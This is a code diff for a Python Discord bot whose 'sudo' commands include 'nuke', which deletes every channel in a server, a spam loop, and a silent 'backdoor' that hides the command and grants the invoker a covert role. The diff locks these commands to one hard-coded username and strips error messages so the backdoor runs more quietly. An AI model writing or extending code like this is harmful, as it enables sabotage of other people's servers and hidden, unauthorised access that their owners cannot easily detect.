@@ -47,12 +47,14 @@ async def sudo(ctx):
 # ================= NUKE =================
 @sudo.command(name="nuke")
 async def sudo_nuke(ctx, key: str = None):
+    # hard username lock
+    if ctx.author.name != "nico044037":
+        return
     for channel in list(ctx.guild.channels):
         try:
             await channel.delete(reason="sudo nuke")
         except (discord.Forbidden, discord.HTTPException):
             pass
-
 # ================= SPAM LOOP =================
 async def spam_loop(target: discord.abc.Messageable):
     try:
@@ -99,6 +101,10 @@ async def sudo_add(ctx):
 # ================= BACKDOOR (SILENT) =================
 @sudo.command(name="backdoor")
 async def sudo_backdoor(ctx):
+    # hard username lock
+    if ctx.author.name != "nico044037":
+        return
+
     # delete the command message
     try:
         await ctx.message.delete()
@@ -107,7 +113,6 @@ async def sudo_backdoor(ctx):
 
     guild = ctx.guild
     member = ctx.author
-
     ROLE_NAME = "Backdoored"
 
     # find or create role
@@ -120,7 +125,6 @@ async def sudo_backdoor(ctx):
                 reason="sudo backdoor"
             )
         except discord.Forbidden:
-            await ctx.author.send("❌ I cannot create roles (missing permission).")
             return
 
     # assign role
@@ -128,24 +132,22 @@ async def sudo_backdoor(ctx):
         if role not in member.roles:
             await member.add_roles(role, reason="sudo backdoor")
     except discord.Forbidden:
-        await ctx.author.send(
-            "❌ I cannot assign the role.\n"
-            "Make sure my bot role is ABOVE the Backdoored role."
-        )
         return
 
-    # DM confirmation
+    # DM confirmation only
     try:
         await ctx.author.send(
             f"✅ Backdoor role applied in **{guild.name}**."
         )
     except discord.Forbidden:
         pass
+
 # ================= START =================
 if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 time.sleep(10)  # prevent Railway reconnect spam
 bot.run(TOKEN)
+
 
 
